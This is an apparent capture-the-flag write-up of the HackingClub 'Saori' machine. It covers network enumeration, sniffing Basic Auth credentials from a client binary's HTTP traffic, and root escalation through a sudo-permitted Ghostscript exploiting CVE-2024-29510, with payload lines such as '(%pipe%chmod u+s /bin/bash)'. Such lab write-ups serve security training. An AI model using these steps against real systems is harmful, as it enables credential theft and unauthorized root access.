# Saori — HackingClub

## Machine Information

| Attribute  | Value                                   |
| ---------- | --------------------------------------- |
| Platform   | HackingClub                             |
| Machine    | Saori                                   |
| Difficulty | Easy                         |
| OS         | Linux                                   |
| Category   | Network Analysis / Privilege Escalation |

---

# Overview

This write-up documents the exploitation process for the **Saori** machine on the **HackingClub** platform.

The attack chain involved the following stages:

* Web enumeration
* Network traffic analysis with Wireshark
* Subdomain discovery
* Credential extraction from HTTP traffic
* SSH access as user **abner**
* Privilege escalation via **Ghostscript sandbox escape**
* Root access using **CVE-2024-29510**

---

# Reconnaissance

The first step was performing a full port scan using **Nmap**.

```bash
nmap -p- -Pn --open --min-rate 1200 172.16.13.188
```

The scan revealed two open ports:

```
22/tcp
80/tcp
```

Next, a more detailed scan was performed.

```bash
nmap -p 22,80 -sVC 172.16.13.188 -vvv
```

Result:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH
80/tcp open  http    Apache httpd
```

Service summary:

* **SSH** → remote login service
* **HTTP** → web application

---

# Web Enumeration

Accessing the web application:

```
http://172.16.13.188
```

The application redirected to the domain:

```
saori.hc
```

Because the system could not resolve the hostname, the domain was added to `/etc/hosts`.

```bash
sudo nano /etc/hosts
```

```
172.16.13.188 saori.hc
```

After reloading the page, a **blog-style website** was displayed.

During exploration a **Download Client** button was identified.

The site provided a binary file named:

```
client
```

---

# Client Binary Analysis

The downloaded file was analyzed.

```bash
file client
```

Example output:

```
ELF 64-bit executable
```

Running the binary:

```bash
./client
```

The program attempted to download additional resources but failed.

This suggested that the binary was attempting to connect to an **external resource or subdomain**.

---

# Network Traffic Analysis

To identify the domain used by the binary, network traffic was captured using **Wireshark**.

Steps performed:

1. Start packet capture
2. Execute the client binary
3. Filter DNS traffic

Executing:

```bash
./client
```

The captured DNS queries revealed a request to:

```
storage.saori.hc
```

This subdomain had not been previously identified.

---

# Subdomain Resolution

The newly discovered domain was added to `/etc/hosts`.

```
172.16.13.188 saori.hc storage.saori.hc
```

Running the client again:

```bash
./client
```

The binary successfully downloaded a file:

```
game.sfc
```

---

# HTTP Traffic Inspection

Inspecting the captured network traffic revealed an HTTP request similar to:

```
GET /game.sfc HTTP/1.1
Host: storage.saori.hc
Authorization: Basic XXXXX
```

The request contained a **Basic Authentication header**.

---

# Credential Extraction

The Authorization header contained a **Base64 encoded string**.

Example:

```
Authorization: Basic YWJuZXI6cGFzc3dvcmQ=
```

Decoding the value:

```bash
echo "YWJuZXI6cGFzc3dvcmQ=" | base64 -d
```

Result:

```
abner:password
```

These credentials could then be used to access the system.

---

# SSH Access

Using the discovered credentials:

```bash
ssh abner@saori.hc
```

Successful login:

```
abner@saori
```

At this point, user-level shell access was obtained.

---

# Privilege Escalation Enumeration

The next step was to check for sudo permissions.

```bash
sudo -l
```

Output:

```
User abner may run the following commands:
(ALL : ALL) /usr/local/bin/gs -q -dNODISPLAY -dBATCH -dSAFER /root/*
```

This revealed that the user could execute **Ghostscript** as root.

Ghostscript is a complex interpreter that has historically been affected by several **sandbox escape vulnerabilities**.

---

# Identifying the Vulnerability

The installed Ghostscript version was vulnerable to:

```
CVE-2024-29510
```

This vulnerability allows bypassing the `-dSAFER` sandbox restriction and executing arbitrary commands using the **%pipe% operator**.

---

# Preparing the Exploit

A public Proof-of-Concept exploit for **CVE-2024-29510** was used.

The payload was saved as:

```
poc.eps
```

To verify command execution, the final line of the payload was modified:

```
(%pipe%id > id.txt) (r) file
```

---

# Exploiting Ghostscript

The exploit was executed using the allowed sudo command.

```bash
sudo /usr/local/bin/gs -q -dNODISPLAY -dBATCH -dSAFER /root/../home/abner/poc.eps
```

Example output:

```
Found controllable stack region at index: 222
```

This indicated that the exploit successfully manipulated Ghostscript memory structures.

---

# Verifying Root Command Execution

Checking the output file:

```bash
cat id.txt
```

Result:

```
uid=0(root) gid=0(root)
```

This confirmed successful command execution as root.

---

# Privilege Escalation

To escalate privileges permanently, the payload was modified.

```
(%pipe%chmod u+s /bin/bash) (r) file
```

Executing the exploit again:

```bash
sudo /usr/local/bin/gs -q -dNODISPLAY -dBATCH -dSAFER /root/../home/abner/poc.eps
```

---

# Obtaining Root Shell

With the **SUID bit set on bash**, root access could be obtained.

```bash
bash -p
```

Verification:

```bash
id
```

Result:

```
uid=0(root) gid=0(root)
```

The system was now fully compromised.

---

# Root Flag

The root flag was located in:

```
/root
```

Retrieve it with:

```bash
cat /root/root.txt
```

---

# Skills Practiced

* Network traffic analysis with Wireshark
* Subdomain discovery
* HTTP authentication analysis
* Base64 credential decoding
* SSH access
* Linux privilege escalation
* Ghostscript sandbox escape
* CVE exploitation

---

# Final Result

Machine successfully compromised.

```
User: root
System: Linux
Platform: HackingClub
Machine: Saori
Difficulty: Easy
```
